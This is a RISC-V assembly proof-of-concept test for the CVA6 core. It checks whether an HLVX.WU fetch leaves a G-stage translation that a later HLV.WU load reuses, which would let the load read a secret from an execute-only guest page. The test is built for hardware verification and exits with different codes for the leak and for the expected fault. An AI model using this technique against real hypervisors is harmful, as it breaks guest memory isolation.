/*
 * CVA6 RVH HLVX-to-HLV G-stage permission reuse security PoC
 *
 * This models a trusted HS/M-mode monitor with two separate helper paths:
 *
 *   1. an internal instruction-fetch/emulation helper uses HLVX.WU on an
 *      execute-only guest page;
 *   2. a caller-visible data-read helper later uses ordinary HLV.WU on the
 *      same G-stage page and is expected to fault because R=0 and MXR=0.
 *
 * Correct behavior:
 *   HLVX.WU at GVA_FETCH succeeds through execute permission.
 *   HLV.WU at GVA_SECRET raises a load guest-page fault.
 *   attacker_buffer remains zero and the program exits with code 0.
 *
 * Vulnerable CVA6 behavior:
 *   The HLVX-filled G-stage translation is reused without re-checking R=0.
 *   HLV.WU reads SECRET_WORD from the execute-only page.
 *   The monitor copies it to attacker_buffer and exits with code 31.
 */
.option push
.option norelax
.option norvc

.equ CSR_HSTATUS,        0x600
.equ CSR_VSATP,          0x280
.equ CSR_HGATP,          0x680

.equ HSTATUS_SPVP,       0x00000100
.equ MSTATUS_MXR,        0x00080000
.equ HGATP_SV39X4,       0x8000000000000000

.equ PTE_V,              0x001
.equ PTE_X,              0x008
.equ PTE_U,              0x010
.equ PTE_A,              0x040
.equ PTE_TABLE,          PTE_V
.equ PTE_XONLY_U,        (PTE_V | PTE_X | PTE_U | PTE_A)

.equ PMP_RWX_NAPOT,      0x1f

.equ GVA_PAGE,           0x0000000040000000
.equ GVA_FETCH,          (GVA_PAGE + 0x000)
.equ GVA_SECRET,         (GVA_PAGE + 0x080)
.equ FETCH_WORD,         0x00000013
.equ SECRET_WORD,        0x5ec01231
.equ CAUSE_LOAD_GPF,     21

.equ ROOT_IDX,           ((GVA_PAGE >> 30) & 0x7ff)
.equ L1_IDX,             ((GVA_PAGE >> 21) & 0x1ff)
.equ L0_IDX,             ((GVA_PAGE >> 12) & 0x1ff)

.macro EXIT code
  csrw satp, zero
  csrw CSR_VSATP, zero
  csrw CSR_HGATP, zero
  li   a0, \code
  la   t3, tohost
  slli t4, a0, 1
  ori  t4, t4, 1
  sd   t4, 0(t3)
  fence
  .word 0x0005006b
1:
  j 1b
.endm

.section .text.init, "ax"
.globl _start
_start:
  la   t0, trap_entry
  csrw mtvec, t0
  csrw medeleg, zero
  csrw mideleg, zero

  csrw satp, zero
  csrw CSR_VSATP, zero
  csrw CSR_HGATP, zero

  /* Ordinary loads must not read execute-only pages. */
  li   t0, MSTATUS_MXR
  csrc mstatus, t0

  li   t0, -1
  csrw pmpaddr0, t0
  li   t0, PMP_RWX_NAPOT
  csrw pmpcfg0, t0

  /* HLV/HLVX act as guest-supervisor accesses. */
  li   t0, HSTATUS_SPVP
  csrs CSR_HSTATUS, t0

  /* Build one G-stage execute-only mapping for the protected page. */
  la   t0, hg_root
  la   t1, hg_l1
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_TABLE
  sd   t1, ROOT_IDX*8(t0)

  la   t0, hg_l1
  la   t1, hg_l0
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_TABLE
  sd   t1, L1_IDX*8(t0)

  la   t0, hg_l0
  la   t1, protected_exec_page
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_XONLY_U
  sd   t1, L0_IDX*8(t0)

  la   t0, hg_root
  srli t0, t0, 12
  li   t1, HGATP_SV39X4
  or   t0, t0, t1
  csrw CSR_HGATP, t0

  fence rw, rw
  .word 0x62000073          /* hfence.gvma x0, x0 */

  /*
   * Monitor-internal instruction fetch. This value is consumed internally and
   * is not copied to attacker_buffer.
   */
  li   t0, GVA_FETCH
.globl monitor_fetch_site
monitor_fetch_site:
  .word (0x68304073 | (6 << 7) | (5 << 15))   /* hlvx.wu x6, (x5) */
  li   t2, FETCH_WORD
  bne  t1, t2, fail_hlvx_value

  /*
   * Caller-visible data-read helper. This must fault because the same G-stage
   * page is execute-only, not readable.
   */
  li   t0, GVA_SECRET
.globl exposed_read_site
exposed_read_site:
  .word (0x68104073 | (6 << 7) | (5 << 15))   /* hlv.wu x6, (x5) */
  li   t2, SECRET_WORD
  beq  t1, t2, leak_secret_to_attacker
  EXIT 32

trap_entry:
  csrr t0, mepc
  la   t1, exposed_read_site
  beq  t0, t1, check_expected_hlv_fault
  la   t1, monitor_fetch_site
  beq  t0, t1, fail_hlvx_trap
  EXIT 42

check_expected_hlv_fault:
  csrr t0, mcause
  li   t1, CAUSE_LOAD_GPF
  bne  t0, t1, fail_wrong_cause

  csrr t0, mtval
  li   t1, GVA_SECRET
  bne  t0, t1, fail_wrong_tval

  la   t0, attacker_buffer
  lw   t1, 0(t0)
  bnez t1, fail_buffer_modified
  EXIT 0

leak_secret_to_attacker:
  la   t0, attacker_buffer
  sw   t1, 0(t0)
  fence rw, rw
  EXIT 31

fail_hlvx_value:
  EXIT 40

fail_hlvx_trap:
  EXIT 41

fail_wrong_cause:
  EXIT 43

fail_wrong_tval:
  EXIT 44

fail_buffer_modified:
  EXIT 45

.section .data.pt, "aw"
.align 14
hg_root:
  .zero 16384

.align 12
hg_l1:
  .zero 4096

.align 12
hg_l0:
  .zero 4096

.section .data, "aw"
.align 12
protected_exec_page:
  .word FETCH_WORD
  .zero 124
secret_payload:
  .word SECRET_WORD
  .zero 3964

.align 3
attacker_buffer:
  .dword 0

.section .tohost, "aw"
.align 3
.globl tohost
tohost:
  .dword 0

.globl fromhost
fromhost:
  .dword 0

.option pop
